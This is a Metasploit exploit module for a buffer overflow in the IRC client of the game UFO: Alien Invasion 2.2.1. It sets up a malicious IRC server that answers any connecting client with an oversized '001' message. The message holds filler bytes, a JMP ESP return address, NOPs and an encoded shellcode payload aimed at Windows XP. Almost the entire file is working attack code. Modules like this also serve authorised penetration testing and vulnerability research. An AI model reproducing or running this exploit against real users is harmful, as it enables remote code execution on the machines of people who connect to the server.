##
# $Id: ufo_ai.rb 10617 2010-10-09 06:55:52Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = AverageRanking

	include Msf::Exploit::Remote::TcpServer

	def initialize(info = {})
		super(update_info(info,
			'Name' => 'UFO: Alien Invasion IRC Client Buffer Overflow Exploit',
			'Description'    => %q{
					This module exploits a buffer overflow in the IRC client component of
				UFO: Alien Invasion 2.2.1.
			},
			'Author' 	 =>
				[
					'Jason Geffner',  # Original Windows PoC Author
					'dookie'          # MSF Module Author
				],
			'License'  => MSF_LICENSE,
			'Version'  => '$Revision: 10617 $',
			'References' =>
				[
					[ 'OSVDB', '65689'],
					[ 'URL', 'http://www.exploit-db.com/exploits/14013' ]
				],
			'Payload' =>
				{
					'Space' => 400,
					'BadChars' => "\x00\x0a\x0d",
					'MaxNops' => 0,
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP Universal', { 'Ret' => 0x0AE59A43 } ], # JMP ESP in SDL_ttf.dll
				],
			'DefaultTarget'  => 0,
			'DisclosureDate' => 'Oct 28 2009'))

		register_options(
			[
				OptPort.new('SRVPORT', [ true, "The IRC daemon port to listen on", 6667 ]),
			], self.class)

	end

	def on_client_connect(client)

		return if ((p = regenerate_payload(client)) == nil)

		print_status("Got client connection...")

		buffer = "001 :"
		buffer << rand_text_alpha_upper(552)
		buffer << [ target.ret ].pack('V')
		buffer << make_nops(8)
		buffer << payload.encoded
		buffer << "\x0d\x0a"

		print_status("Sending exploit to #{client.peerhost}:#{client.peerport}...")

		client.put(buffer)

	end

end